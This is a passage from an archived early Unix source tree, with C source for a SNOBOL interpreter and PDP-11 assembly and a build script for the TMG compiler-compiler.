	register struct node *a, *b;
	register int c;
	static next;

	if (next == 0)
		schar = getc(); else
		next = 0;
	if (schar == 0) {
		(a=alloc())->typ = 0;
		return(a);
	}
	switch (class(schar->ch)) {

	case 1:
		schar->typ = 5;
		return(schar);

	case 2:
		schar->typ = 16;
		return(schar);

	case 3:
		a = schar;
		for(;;) {
			schar = getc();
			if (schar == 0) {
				a->typ = 0;
				return(a);
			}
			if (class(schar->ch) != 3)
				break;
			free(schar);
		}
		next = 1;
		a->typ = 7;
		return(a);

	case 4:
		schar->typ = 8;
		return(schar);

	case 5:
		schar->typ = 9;
		return(schar);

	case 6:
		a = schar;
		schar = getc();
		if (class(schar->ch) == 3)
			a->typ = 10; else
			a->typ = 1;
		next = 1;
		return(a);

	case 7:
		a = schar;
		schar = getc();
		if (class(schar->ch) == 3)
			a->typ = 11; else
			a->typ = 2;
		next = 1;
		return(a);

	case 8:
		schar->typ = 12;
		return(schar);

	case 9:
		c = schar->ch;
		a = getc();
		if(a == 0)
			goto lerr;
		b = schar;
		if(a->ch == c) {
			free(schar);
			a->typ = 15;
			a->p1 = 0;
			return(a);
		}
		b->p1 = a;
		for(;;) {
			schar = getc();
			if (schar == 0)
			lerr:
				writes("illegal literal string");
			if(schar->ch == c)
				break;
			a->p1 = schar;
			a = schar;
		}
		b->p2 = a;
		schar->typ = 15;
		schar->p1 = b;
		return(schar);

	case 10:
		schar->typ = 3;
		return(schar);

	case 11:
		schar->typ = 4;
		return(schar);

	}
	b = alloc();
	b->p1 = a = schar;
	schar = getc();
	while(schar!=0 & !class(schar->ch)) {
		a->p1 = schar;
		a = schar;
		schar = getc();
	}
	b->p2 = a;
	next = 1;
	a = look(b);
	delete(b);
	b = alloc();
	b->typ = 14;
	b->p1 = a;
	return(b);
}

nscomp()
{
	register struct node *c;

	while((c=compon())->typ == 7)
		free(c);
	return(c);
}

push(stack) {
	register struct node *a;

	(a=alloc())->p2 = stack;
	return(a);
}

pop(stack)
struct node *stack;
{
	register struct node *a, *s;

	s = stack;
	if (s == 0)
		writes("pop");
	a = s->p2;
	free(s);
	return(a);
}

expr(start, eof, e)
struct node *e;
{
	register struct node *stack, *list, *comp;
	int operand, op, space, op1;
	struct node *a, *b, *c;
	int d;

	list = alloc();
	e->p2 = list;
	stack = push(0);
	stack->typ = eof;
	operand = 0;
	space = start;
l1:
	if (space) {
		comp = space;
		space = 0;
	} else
		comp = compon();

l3:
	op = comp->typ;
	switch (op) {

	case 7:
		space = 1;
		free(comp);
		comp = compon();
		goto l3;

	case 10:
		if (space == 0) {
			comp->typ = 1;
			goto l3;
		}

	case 11:
		if (space == 0) {
			comp->typ = 2;
			goto l3;
		}

	case 8:
	case 9:
		if (operand == 0)
			writes("no operand preceding operator");
		operand = 0;
		goto l5;

	case 14:
	case 15:
		if (operand == 0) {
			operand = 1;
			goto l5;
		}
		if (space == 0)
			goto l7;
		goto l4;

	case 12:
		if (operand == 0)
			goto l5;
		if (space)
			goto l4;
	l7:
		writes("illegal juxtaposition of operands");

	case 16:
		if (operand == 0)
			goto l5;
		if (space)
			goto l4;
		b = compon();
		op = comp->typ = 13;
		if (b->typ == 5) {
			comp->p1 = 0;
			goto l10;
		}
		comp->p1 = a = alloc();
		b = expr(b, 6, a);
		while((d=b->typ) == 4) {
			a->p1 = b;
			a = b;
			b = expr(0, 6, a);
		}
		if (d != 5)
			writes("error in function");
		a->p1 = 0;
	l10:
		free(b);
		goto l6;

	l4:
		space = comp;
		op = 7;
		operand = 0;
		goto l6;
	}
	if (operand==0)
		writes("no operand at end of expression");
l5:
	space = 0;
l6:
	op1 = stack->typ;
	if (op > op1) {
		stack = push(stack);
		if (op == 16)
			op = 6;
		stack->typ = op;
		stack->p1 = comp;
		goto l1;
	}
	c = stack->p1;
	stack = pop(stack);
	if (stack == 0) {
		list->typ = 0;
		return(comp);
	}
	if (op1 == 6) {
		if (op != 5)
			writes("too many ('s");
		goto l1;
	}
	if (op1 == 7)
		c = alloc();
	list->typ = op1;
	list->p2 = c->p1;
	list->p1 = c;
	list = c;
	goto l6;
}

match(start, m)
struct node *m;
{
	register struct node *list, *comp, *term;
	struct node *a;
	int b, bal;

	term = bal = 0;
	list = alloc();
	m->p2 = list;
	comp = start;
	if (!comp)
		comp = compon();
	goto l2;

l3:
	list->p1 = a = alloc();
	list = a;
l2:
	switch (comp->typ) {
	case 7:
		free(comp);
		comp = compon();
		goto l2;

	case 12:
	case 14:
	case 15:
	case 16:
		term = 0;
		comp = expr(comp, 6, list);
		list->typ = 1;
		goto l3;

	case 1:
		free(comp);
		comp = compon();
		bal = 0;
		if (comp->typ == 16) {
			bal = 1;
			free(comp);
			comp = compon();
		}
		a = alloc();
		b = comp->typ;
		if (b == 2 | b == 5 | b == 10 | b == 1)
			a->p1 = 0; else {
			comp = expr(comp, 11, a);
			a->p1 = a->p2;
		}
		if (comp->typ != 2) {
			a->p2 = 0;
		} else {
			free(comp);
			comp = expr(0, 6, a);
		}
		if (bal) {
			if (comp->typ != 5)
				goto merr;
			free(comp);
			comp = compon();
		}
		b = comp->typ;
		if (b != 1 & b != 10)
			goto merr;
		list->p2 = a;
		list->typ = 2;
		a->typ = bal;
		free(comp);
		comp = compon();
		if(bal)
			term = 0; else
			term = list;
		goto l3;
	}
	if(term)
		term->typ = 3;
	list->typ = 0;
	return(comp);

merr:
	writes("unrecognized component in match");
}

compile() {
	register struct node *b, *comp;
	struct node *r, *l, *xs, *xf, *g;
	register int a;
	int m, t, as;

	m = l = as = xs = xf = t = 0;
	comp = compon();
	a = comp->typ;
	if (a == 14) {
		l = comp->p1;
		free(comp);
		comp = compon();
		a = comp->typ;
	}
	if (a != 7)
		writes("no space beginning statement");
	free(comp);
	if (l == lookdef)
		goto def;
	comp = expr(0, 11, r=alloc());
	a = comp->typ;
	if (a == 0)
		goto asmble;
	if (a == 2)
		goto xfer;
	if (a == 3)
		goto assig;
	m = alloc();
	comp = match(comp, m);
	a = comp->typ;
	if (a == 0)
		goto asmble;
	if (a == 2)
		goto xfer;
	if (a == 3)
		goto assig;
	writes("unrecognized component in match");

assig:
	free(comp);
	comp = expr(0, 6, as=alloc());
	a = comp->typ;
	if (a == 0)
		goto asmble;
	if (a == 2)
		goto xfer;
	writes("unrecognized component in assignment");

xfer:
	free(comp);
	comp = compon();
	a = comp->typ;
	if (a == 16)
		goto xboth;
	if (a == 0) {
		if (xs!=0 | xf!=0)
			goto asmble;
		goto xerr;
	}
	if (a != 14)
		goto xerr;
	b = comp->p1;
	free(comp);
	if (b == looks)
		goto xsuc;
	if (b == lookf)
		goto xfail;

xerr:
	writes("unrecognized component in goto");

xboth:
	free(comp);
	xs = alloc();
	xf = alloc();
	comp = expr(0, 6, xs);
	if (comp->typ != 5)
		goto xerr;
	xf->p2 = xs->p2;
	comp = compon();
	if (comp->typ != 0)
		goto xerr;
	goto asmble;

xsuc:
	if(xs)
		goto xerr;
	comp = compon();
	if (comp->typ != 16)
		goto xerr;
	comp = expr(0, 6, xs=alloc());
	if (comp->typ != 5)
		goto xerr;
	goto xfer;

xfail:
	if (xf)
		goto xerr;
	comp = compon();
	if (comp->typ != 16)
		goto xerr;
	comp = expr(0, 6, xf=alloc());
	if (comp->typ != 5)
		goto xerr;
	goto xfer;

asmble:
	if(l) {
		if (l->typ)
			writes("name doubly defined");
		l->p2 = comp;
		l->typ = 2; /* type label;*/
	}
	comp->p2 = r;
	if (m) {
		t++;
		r->p1 = m;
		r = m;
	}
	if (as) {
		t =+ 2;
		r->p1 = as;
		r = as;
	}
	(g=alloc())->p1 = 0;
	if (xs) {
		g->p1 = xs->p2;
		free(xs);
	}
	g->p2 = 0;
	if (xf) {
		g->p2 = xf->p2;
		free(xf);
	}
	r->p1 = g;
	comp->typ = t;
	comp->ch = lc;
	return(comp);

def:
	r = nscomp();
	if (r->typ != 14)
		goto derr;
	l = r->p1;
	if (l->typ)
		writes("name doubly defined");
	l->typ = 5; /*type function;*/
	a = r;
	l->p2 = a;
	r = nscomp();
	l = r;
	a->p1 = l;
	if (r->typ == 0)
		goto d4;
	if (r->typ != 16)
		goto derr;

d2:
	r = nscomp();
	if (r->typ != 14)
		goto derr;
	a->p2 = r;
	r->typ = 0;
	a = r;
	r = nscomp();
	if (r->typ == 4) {
		free(r);
		goto d2;
	}
	if (r->typ != 5)
		goto derr;
	free(r);
	if ((r=compon())->typ != 0)
		goto derr;
	free(r);

d4:
	r = compile();
	a->p2 = 0;
	l->p1 = r;
	l->p2 = 0;
	return(r);

derr:
	writes("illegal component in define");
}
-- /usr/source/sno/sno3.c mode=0100664 uid=3 gid=3 atime=174924444 mtime=169260941 --
#include "sno.h"

/*
 * sno3
 */


bextend(str, last)
struct node *str, *last;
{
	register struct node *a, *s;
	register int b;
	int c, d;

	s = str;
	if ((c = s->p1) == 0)
		goto bad;
	b = d = 0;
	a = s->p2;
	if(a == 0) {
		a = c;
		goto eb2;
	}
eb1:
	if (a == last)
		goto bad;
	a = a->p1;
eb2:
	d++;
	c = class(a->ch);
	if (c == 1) { /* rp */
		if (b == 0)
			goto bad;
		b--;
		goto eb3;
	}
	if (c == 2) { /* lp */
		b++;
		goto eb1;
	}
eb3:
	if (b == 0) {
		s->p2= a;
		return(d);
	}
	goto eb1;
bad:
	return(0);
}

ubextend(str, last)
struct node *str, *last;
{
	register struct node *a, *b, *s;

	s = str;
	a = s->p1;
	if(a == 0)
		goto bad;
	b = s->p2;
	if(b == 0)
		goto good;
	if (b == last)
		goto bad;
	a = b->p1;
good:
	s->p2 = a;
	return(1);
bad:
	return(0);
}

search(arg, r)
struct node *arg, *r;
{
	struct node *list, *back, *str,
		*etc, *next, *last, *base, *e;
	register struct node *a, *b, *var;
	int c, d;

	a = arg->p2;
	list = base = alloc();
	last = next = 0;
	goto badv1;
badvanc:
	a = a->p1;
	if (a->typ == 0) {
		list->p1 = 0;
		if (rfail == 1) {
			a = 0;
			goto fail;
		}
		list = base;
		if (r == 0)
			next = last = 0; else {
			next = r->p1;
			last = r->p2;
		}
		goto adv1;
	}
	b = alloc();
	list->p1 = b;
	list = b;
badv1:
	list->p2 = back = alloc();
	back->p1 = last;
	b = a->p2;
	c = a->typ;
	list->typ = c;
	if (c < 2) {
		back->p2 = eval(b, 1);
		goto badvanc;
	}
	last = list;
	str = alloc();
	etc = alloc();
	back->p2 = var = alloc();
	var->typ = b->typ;
	var->p1 = str;
	var->p2 = etc;
	e = b->p1;
	if (e == 0)
		etc->p1 = 0; else
		etc->p1 = eval(e, 0);
	e = b->p2;
	if (e == 0)
		etc->p2 = 0; else {
		e = eval(e, 1);
		etc->p2 = strbin(e);
		delete(e);
	}
	goto badvanc;

retard:
	a = back->p1;
	if (a == 0) {
		rfail = 1;
		goto fail;
	}
	list = a;
	back = list->p2;
	var = back->p2;
	str = var->p1;
	etc = var->p2;
	if (etc->p2)
		goto retard;
	if (var->typ == 1) {
		if (bextend(str, last) == 0)
			goto retard;
		goto adv0;
	}
	if (ubextend(str, last) == 0)
		goto retard;
adv0:
	a = str->p2;
adv01:
	if (a == last)
		next = 0; else
		next = a->p1;
advanc:
	a = list->p1;
	if (a == 0) {
		a = alloc();
		if (r == 0) {
			a->p1 = a->p2 = 0;
			goto fail;
		}
		b = r->p1;
		a->p1 = b;
		if (next == 0) {
			a->p2 = r->p2;
			goto fail;
		}
		while(1) {
			e = b->p1;
			if (e == next) {
				a->p2 = b;
				goto fail;
			}
			b = e;
		}
	}
	list = a;
adv1:
	back = list->p2;
	var = back->p2;
	d = list->typ;
	if(d < 2) {
		if (var == 0)
			goto advanc;
		if (next == 0)
			goto retard;
		a = next;
		b = var->p1;
		e = var->p2;
		while(1) {
			if (a->ch != b->ch)
				goto retard;
			if (b == e)
				goto adv01;
			if (a == last)
				goto retard;
			a = a->p1;
			b = b->p1;
		}
	}
	str = var->p1;
	etc = var->p2;
	str->p1 = next;
	str->p2 = 0;
	c = etc->p2;
	if (var->typ == 1) {
		d = bextend(str, last);
		if (d == 0)
			goto retard;
		if (c == 0)
			goto adv0;
		while(1) {
			c =- d;
			if (c == 0)
				goto adv0;
			if (c < 0)
				goto retard;
			d = bextend(str, last);
			if (d == 0)
				goto retard;
		}
	}
	if (c == 0) {
		if(d==3 & next!=0) {
			str->p2 = last;
			goto adv0;
		}
		goto advanc;
	}
	while(c--)
		if (ubextend(str, last) == 0)
			goto retard;
	goto adv0;

fail:
	list = base;
	goto f1;
fadv:
	free(back);
	b = list->p1;
	free(list);
	if (b == 0)
		return(a);
	list = b;
f1:
	back = list->p2;
	var = back->p2;
	if (list->typ < 2) {
		delete(var);
		goto fadv;
	}
	str = var->p1;
	etc = var->p2;
	if (a != 0 & etc->p1 != 0) {
		if (str->p2 == 0) {
			free(str);
			str = 0;
		}
		assign(etc->p1, copy(str));
	}
	if (str)
		free(str);
	free(etc);
	free(var);
	goto fadv;
}
-- /usr/source/sno/sno4.c mode=0110664 uid=3 gid=3 atime=174924455 mtime=169260941 --
#include "sno.h"
/*
 * sno4
 */


and(ptr)
struct node *ptr;
{
	register struct node *a, *p;

	p = ptr;
	a = p->p1;
	if (p->typ == 0) {
		switch (a->typ) {
		case0:
		case 0:
			a->typ = 1;
		case 1:
			goto l1;
		case 3:
			flush();
			return(syspit());
		case 5:
			a = a->p2->p1;
			goto l1;
		case 6:
			return(binstr(nfree()));
		}
		writes("attempt to take an illegal value");
		goto case0;
	l1:
		a = copy(a->p2);
	}
	return(a);
}

eval(e, t)
struct node *e;
{
	struct node *list, *a2, *a3, *a4, *a3base;
	register struct node *a1, *stack, *op;

	if (rfail == 1)
		return(0);
	stack = 0;
	list = e;
	goto l1;
advanc:
	list = list->p1;
l1:
	op = list->typ;
	switch (op) {
		default:
		case 0:
		if (t == 1) {
			a1 = and(stack);
			goto e1;
		}
		if (stack->typ == 1)
			writes("attempt to store in a value");
		a1 = stack->p1;
	e1:
		stack = pop(stack);
		if (stack)
			writes("phase error");
		return(a1);
	case 12:
		a1 = and(stack);
		stack->p1 = look(a1);
		delete(a1);
		stack->typ = 0;
		goto advanc;
	case 13:
		if (stack->typ)
			writes("illegal function");
		a1 = stack->p1;
		if (a1->typ!=5)
			writes("illegal function");
		a1 = a1->p2;
		op = a1->p1;
		a3base = a3 = alloc();
		a3->p2 = op->p2;
		op->p2 = 0;
		a1 = a1->p2;
		a2 = list->p2;
	f1:
		if (a1!=0 & a2!=0)
			goto f2;
		if (a1!=a2)
			writes("parameters do not match");
		op = op->p1;
		goto f3;
	f2:
		a3->p1 = a4 = alloc();
		a3 = a4;
		a3->p2 = and(a1);
		assign(a1->p1, eval(a2->p2, 1));/* recursive */
		a1 = a1->p2;
		a2 = a2->p1;
		goto f1;
	f3:
		op = execute(op); /* recursive */
		if (op)
			goto f3;
		a1 = stack->p1->p2;
		op = a1->p1;
		a3 = a3base;
		stack->p1 = op->p2;
		stack->typ = 1;
		op->p2 = a3->p2;
	f4:
		a4 = a3->p1;
		free(a3);
		a3 = a4;
		a1 = a1->p2;
		if (a1 == 0)
			goto advanc;
		assign(a1->p1, a3->p2);
		goto f4;
	case 11:
	case 10:
	case 9:
	case 8:
	case 7:
		a1 = and(stack);
		stack = pop(stack);
		a2 = and(stack);
		a3 = doop(op, a2, a1);
		delete(a1);
		delete(a2);
		stack->p1 = a3;
		stack->typ = 1;
		goto advanc;
	case 15:
		a1 = copy(list->p2);
		a2 = 1;
		goto l3;
	case 14:
		a1 = list->p2;
		a2 = 0;
	l3:
		stack = push(stack);
		stack->p1 = a1;
		stack->typ = a2;
		goto advanc;
	}
}

doop(op, arg1, arg2)
{
	register int a1, a2;

	a1 = arg1;
	a2 = arg2;
	switch (op) {

	case 11:
		return(div(a1, a2));
	case 10:
		return(mult(a1, a2));
	case 8:
		return(add(a1, a2));
	case 9:
		return(sub(a1, a2));
	case 7:
		return(cat(a1, a2));
	}
	return(0);
}

execute(e)
struct node *e;
{
	register struct node *r, *b, *c;
	struct node *m, *ca, *d, *a;

	r = e->p2;
	lc = e->ch;
	switch (e->typ) {
	case 0: /*  r g */
		a = r->p1;
		delete(eval(r->p2, 1));
		goto xsuc;
	case 1: /*  r m g */
		m = r->p1;
		a = m->p1;
		b = eval(r->p2, 1);
		c = search(m, b);
		delete(b);
		if (c == 0)
			goto xfail;
		free(c);
		goto xsuc;
	case 2: /*  r a g */
		ca = r->p1;
		a = ca->p1;
		b = eval(r->p2, 0);
		assign(b, eval(ca->p2, 1));
		goto xsuc;
	case 3: /*  r m a g */
		m = r->p1;
		ca = m->p1;
		a = ca->p1;
		b = eval(r->p2, 0);
		d = search(m, b->p2);
		if (d == 0)
			goto xfail;
		c = eval(ca->p2, 1);
		if (d->p1 == 0) {
			free(d);
			assign(b, cat(c, b->p2));
			delete(c);
			goto xsuc;
		}
		if (d->p2 == b->p2->p2) {
			assign(b, c);
			free(d);
			goto xsuc;
		}
		(r=alloc())->p1 = d->p2->p1;
		r->p2 = b->p2->p2;
		assign(b, cat(c, r));
		free(d);
		free(r);
		delete(c);
		goto xsuc;
	}
xsuc:
	if (rfail)
		goto xfail;
	b = a->p1;
	goto xboth;
xfail:
	rfail = 0;
	b = a->p2;
xboth:
	if (b == 0) {
		return(e->p1);
	}
	b = eval(b, 0);
	if (b == lookret)
		return(0);
	if (b == lookfret) {
		rfail = 1;
		return(0);
	}
	if (b->typ!=2)
		writes("attempt to transfer to non-label");
	return(b->p2);
}

assign(adr, val)
struct node *adr, *val;
{
	register struct node *a, *addr, *value;

	addr = adr;
	value = val;
	if (rfail == 1) {
		delete(value);
		return;
	}
	switch (addr->typ) {
	default:
		writes("attempt to make an illegal assignment");
	case 0:
		addr->typ = 1;
	case 1:
		delete(addr->p2);
		addr->p2 = value;
		return;
	case 4:
		sysput(value);
		return;
	case 5:
		a = addr->p2->p1;
		delete(a->p2);
		a->p2 = value;
		return;
	}
}
-- /usr/source/tmg mode=0140775 uid=3 gid=3 atime=174930093 mtime=174924588 --
-- /usr/source/tmg/run mode=0100664 uid=3 gid=3 atime=174924587 mtime=174917298 --
as tmga.s
cmp a.out /usr/lib/tmga
cp a.out /usr/lib/tmga

as tmgc.s
cmp a.out /usr/lib/tmgc
cp a.out /usr/lib/tmgc

chdir tmgb
as any.s; mv a.out any.o
as append.s; mv a.out append.o
as arith.s; mv a.out arith.o
as bundle.s; mv a.out bundle.o
as char.s; mv a.out char.o
as copy.s; mv a.out copy.o
as cstr.s; mv a.out cstr.o
as ctest.s; mv a.out ctest.o
as decmal.s; mv a.out decmal.o
as discd.s; mv a.out discd.o
as emit.s; mv a.out emit.o
as end.s; mv a.out end.o
as f.s; mv a.out f.o
as find.s; mv a.out find.o
as getnam.s; mv a.out getnam.o
as ignore.s; mv a.out ignore.o
as inc.s; mv a.out inc.o
as infix.s; mv a.out infix.o
as jget.s; mv a.out jget.o
as lvrv.s; mv a.out lvrv.o
as mult.s; mv a.out mult.o
as octal.s; mv a.out octal.o
as params.s; mv a.out params.o
as push.s; mv a.out push.o
as putcal.s; mv a.out putcal.o
as putdec.s; mv a.out putdec.o
as putoct.s; mv a.out putoct.o
as px.s; mv a.out px.o
as reln.s; mv a.out reln.o
as shift.s; mv a.out shift.o
as stack.s; mv a.out stack.o
as string.s; mv a.out string.o
as table.s; mv a.out table.o
as tq.s; mv a.out tq.o
as trace.s; mv a.out trace.o
as trans.s; mv a.out trans.o
as tx.s; mv a.out tx.o
as unary.s; mv a.out unary.o
ar r /lib/tmgb *.o
rm *.o

chdir ..
as - tmgl.s
ld -s /usr/lib/tmga a.out /usr/lib/tmgb /usr/lib/tmgc -ls
cmp a.out /usr/lib/tmg
cp a.out /usr/lib/tmg
/usr/lib/tmg tmgl.t x
cmp x tmgl.s
cp x tmgl.s

rm a.out x
-- /usr/source/tmg/tmga.s mode=0110664 uid=3 gid=3 atime=174924476 mtime=169260948 --
/ tmg
/ main program and parsing rule interpreter
/
tracing = 1
f = r5
g = r4
i = r3

sef=sec^sec; clf=clc^clc; bfs=bcs^bcs; bfc=bcc^bcc	/fail indicator

.globl flush,obuild,putch,iget,kput
.globl generate
.globl cfile,dfile,ofile,input
.globl main,succ,fail,errcom,pbundle,parse,diag
.globl alt,salt,stop,goto
.globl tables,start,end
.globl stkb,stke
.globl ktab
.globl trswitch,trace
.globl x,si,j,k,n,g1,env

/ begin here
/ get arguments from shell
/ arg1 is input file
/ arg2 is output file (standard output if missing)

main:
	dec	(sp)
	beq	3f
	mov	4(sp),0f
	sys	open;0:0;0
	bes	1f
	mov	r0,input
	dec	(sp)
	beq	3f
	mov	6(sp),0f
	sys	creat;0:0;666
	bes	1f
	mov	r0,ofile

/ set up tables
/ initialize stack, for definitions see tmgc.s
/ go interpret beginning at "start"
/ finish up
3:
	mov	$stkb,f
	clr	j(f)
	clr	k(f)
	clr	n(f)
	mov	f,g
	add	$g1,g
	mov	$start,r0
	jsr	pc,adv
	jsr	pc,flush
1:
	sys	unlink;1f
	sys	exit
1:
		<alloc.d\0>;.even
/ fatal processor error
/write a two letter message on diagnostic file
/ get a dump

errcom:
	mov	dfile,cfile
	jsr	pc,obuild
	mov	$1f,r0
	jsr	pc,obuild
	jsr	pc,flush
stop:
	4
1:	<--fatal\n\0>;.even

/ all functions that succeed come here
/ test the exit indicator, and leave the rule if on

succ:
	inc	succc
	bit	$1,x(f)
	bne	sret
contin:
	inc	continc
    .if tracing
	tst	trswitch
	beq	1f
	mov	$'r,r0
	jsr	pc,trace
1:
    .endif
/ get interpreted instruction
/ save its exit bit (bit 0) on stack
/ distinguish type of instruction by ranges of value

	jsr	pc,iget
	mov	r0,x(f)
	bic	$1,r0
.if ..
	cmp	r0,$..
	blo	1f
.endif
	cmp	r0,$start
	blo	2f
	cmp	r0,$end
	blo	3f
	cmp	r0,$tables
	blo	2f

/ bad address
1:
	jsr	r0,errcom
		<bad address in parsing\0>;.even

/ machine coded function
2:
	jmp	(r0)

/ tmg-coded rule, execute and test its success
/ bfc = branch on fail clear
3:
	jsr	pc,adv
	bfc	succ

/ all functions and rules that fail come here
/ if exit bit is on do a fail return
/ if following instruction is an alternate (recognized literally)
/ do a goto, if a success alternate, do a nop
/ otherwise do a fail return

fail:
	inc	failc
	bit	$1,x(f)
	bne	fret
	jsr	pc,iget
	mov	r0,x(f)
	bic	$1,r0
	cmp	r0,$alt
	beq	salt
	cmp	r0,$salt
	bne	fret

alt:
	tst	(i)+
	br	succ

salt:
	jsr	pc,iget
	mov	r0,i
	br	contin

goto:
	br	salt

/ do a success return
/ bundle translations delivered to this rule,
/ pop stack frame
/ restore  interpreted instruction counter (i)
/ update input cursor (j) for invoking rule
/ update high water mark (k) in ktable
/ if there was a translation delivered, add to stack frame
/ clear the fail flag

sret:
	mov	f,r0
	add	$g1,r0
	jsr	pc,pbundle
	mov	f,g
	mov	(f),f
	mov	si(f),i
	mov	j(g),j(f)
	mov	k(g),k(f)
	tst	r0
	beq	1f
	mov	r0,(g)+
1:
	clf
	rts	pc

/ do a fail return
/ pop stack
/ do not update j or k
/ restore interpreted instruction counter

fret:
	mov	f,g
	mov	(f),f
	mov	si(f),i
	sef
	rts	pc

/ diag and parse builtins
/ set current file to diagnostic or output
/ save and restore ktable water mark around parse-translate
/ also current file and next frame pointer (g)
/ execute parsing rule

diag:
	mov	dfile,r1
	br	1f
parse:
	mov	ofile,r1
1:
	mov	cfile,-(sp)
	mov	r1,cfile
	mov	k(f),-(sp)
	mov	g,-(sp)
	jsr	pc,iget
	jsr	pc,adv
	bfs	1f
/ rule succeeded
/ if it delivered translation, put it in ktable and set
/ instruction counter for
/ translation generator to point there
/ go generate
	cmp	g,(sp)+
	ble	2f
	mov	-(g),r0
	jsr	pc,kput
	mov	k(f),i
	neg	i
	add	$ktab,i
	mov	f,-(sp)
	mov	g,f
	clr	x(f)
	jsr	pc,generate
	mov	(sp)+,f
	mov	si(f),i
2:
	mov	(sp)+,k(f)
	mov	(sp)+,cfile
	jmp	succ
1:
	mov	(sp)+,g
	mov	(sp)+,k(f)
	mov	(sp)+,cfile
	br	fail

/ advance stack frame to invoke a parsing rule
/ copy  corsor, watr mark, ignored class to new frame
/ set intial frame length to default (g1)
/ check end of stack
/ r0,r1 are new i,environment

adv:
	inc	advc
	mov	f,(g)
	mov	i,si(f)
	mov	j(f),j(g)
	mov	k(f),k(g)
	mov	n(f),n(g)
	mov	g,f
	add	$g1,g
	cmp	g,$stke
	bhis	1f
	mov	r0,i
	mov	r1,env(f)
	jmp	contin
1:
	jsr	r0,errcom
		<stack overflow\0>;.even

/pbundle entered with pointer to earliest element of bunlde
/to reduce from the top of stack in r0
/exit with pointer to bundle in r0, or zero if bundle is empty

pbundle:
	cmp	r0,g
	blo	1f
	clr	r0	/empty bundle
	rts	pc
1:
	mov	r0,-(sp)
	mov	r0,r1
	mov	(r1)+,r0
	cmp	r1,g
	beq	2f		/trivial bundle
1:
	mov	r1,-(sp)
	jsr	pc,kput
	mov	(sp)+,r1
	mov	(r1)+,r0
	cmp	r1,g
	blos	1b
	mov	k(f),r0
2:
	mov	(sp)+,g
	rts	pc

/ tmg translation rule interpreter (generator)
/ see tmgc.s for definitions

tracing = 1
f = r5
.globl x,si,ek,ep,ek.fs,ep.fs,fs
.globl trswitch,trace
.globl start,end,tables,ktab,ktat
.globl errcom
.globl generate,.tp
i = r3

/ if exit bit is on pop stack frame restore inst counter and return

generate:
bit	$1,x(f)
	beq	gcontin
	sub	$fs,f
	mov	si(f),i
	rts	pc
gcontin:
    .if tracing
	tst	trswitch
	beq	1f
	mov	$'g,r0
	jsr	pc,trace
1:
    .endif 
/ get interpreted instruction, decode by range of values

	mov	(i)+,r0
	mov	r0,x(f)
	bic	$1,r0
.if ..
	cmp	r0,$..
	blo	badadr
.endif
	cmp	r0,$start
	blo	gf
	cmp	r0,$end
	blo	gc
	cmp	r0,$tables
	blo	gf
	neg	r0
	cmp	r0,$ktat
	blo	gk
badadr:
	jsr	r0,errcom
		<bad address in translation\0>;.even

/ builtin  translation function
gf:
	jmp	(r0)

/ tmg-coded translation subroutine
/ execute it in current environment
gc:
	mov	i,si(f)
	mov	r0,i
	mov	ek(f),ek.fs(f)
	mov	ep(f),ep.fs(f)
	add	$fs,f
	jsr	pc,gcontin
	br	generate

/ delivered compound translation
/ instruction counter is in ktable
/ set the k environment for understanding 1, 2 ...
/ to designate this frame
gk:
	mov	f,ek(f)
	add	$ktab,r0
	mov	r0,i
	br	gcontin

/ execute rule called for by 1 2 ...
/ found relative to instruction counter in the k environment
/ this frame becomes th p environment for
/ any parameters passed with this invocation
/ e.g. for 1(x) see also .tq
.tp:
	movb	(i)+,r0
	movb	(i)+,r2
	inc	r0
	asl	r0
	mov	i,si(f)
	mov	f,ep.fs(f)
	mov	ek(f),r1
	mov	si(r1),i
	sub	r0,i
	add	$fs,f
	mov	f,ek(f)
	asl	r2
	beq	2f
/element is 1.1, 1.2, .. 2.1,...
	mov	(i),i
	neg	i
	bge	1f
	jsr	r0,errcom
		<not a bundle\0>;.even
1:
	cmp	i,$ktat
	bhis	badadr
	add	$ktab,i
	sub	r2,i
2:
	jsr	pc,gcontin
	br	generate

/ tmg output routines/ and iget
f = r5
i = r3
.globl env,si
.globl errcom
.globl cfile,lfile
.globl putch,obuild,iget,flush
.globl outb,outt,outw
.globl start

/ adds 1 or 2 characters in r0 to output

putch:
	clr	-(sp)
	mov	r0,-(sp)
	mov	sp,r0
	jsr	pc,obuild
	add	$4,sp
	rts	pc

/ r0 points to string to put out  on current output file (cfile)
/ string terminated by 0
/ if last file differed from current file, flush output buffer first
/ in any case flush output buffer when its write pointer (outw)
/ reaches its top (outt)

obuild:
	cmp	cfile,lfile
	beq	1f
	mov	r0,-(sp)
	jsr	pc,flush
	mov	(sp)+,r0
	mov	cfile,lfile
1:
	mov	outw,r1
1:
	tstb	(r0)
	beq	1f
	movb	(r0)+,outb(r1)
	inc	r1
	mov	r1,outw
	cmp	r1,$outt
	blt	1b
	mov	r0,-(sp)
	jsr	pc,flush
	mov	(sp)+,r0
	br	obuild
1:
	rts	pc

/ copy output buffer onto last output file and clear buffer

flush:
	mov	outw,0f
	mov	lfile,r0
	sys	write;outb;0:0
	clr	outw
	rts	pc


/ get interpreted instruction for a parsing rule
/ negative instruction is a pointer to a parameter in this
/ stack fromae, fetch that instead
/ put environment pointer in r1

iget:
	mov	f,r1
	mov	(i)+,r0
	bge	2f
	mov	r0,-(sp)	/save the exit bit 
	bic	$-2,(sp)
	bic	(sp),r0
1:			/chase parameter
	mov	env(r1),r1
	add	si(r1),r0
	mov	(r0),r0
	blt	1b
	mov	env(r1),r1
	bis	(sp)+,r0
2:
	rts	pc
/there followeth the driving tables
start:

.data
succc:	0
continc:	0
failc:	0
advc:	0
.text
-- /usr/source/tmg/tmgb mode=0140775 uid=3 gid=3 atime=174930093 mtime=174924565 --
-- /usr/source/tmg/tmgb/any.s mode=0100664 uid=3 gid=3 atime=174924482 mtime=169260961 --
i = r3
f = r5
.globl x,j
.globl succ,fail
.globl	ctest,iget
.globl any

any:
	mov	j(f),-(sp)
	jsr	pc,iget
	jsr	pc,ctest
	bcs	1f
	mov	(sp)+,j(f)
	jmp	fail
1:
	tst	(sp)+
	jmp	succ
-- /usr/source/tmg/tmgb/append.s mode=0100664 uid=3 gid=3 atime=174924484 mtime=169260961 --
.globl succ
.globl putcstr,iget
.globl append

append:
	jsr	pc,iget
	mov	r0,-(sp)
1:
	movb	*(sp),r0
	beq	1f
	jsr	pc,putcstr
	inc	(sp)
	br	1b
1:
	tst	(sp)+
	jmp	succ
-- /usr/source/tmg/tmgb/arith.s mode=0100664 uid=3 gid=3 atime=174924487 mtime=169260961 --
.globl succ,fail,iget
.globl seekchar,getword,alterword
.globl sprv,update
.globl .l,.u,.p,.t,.st,
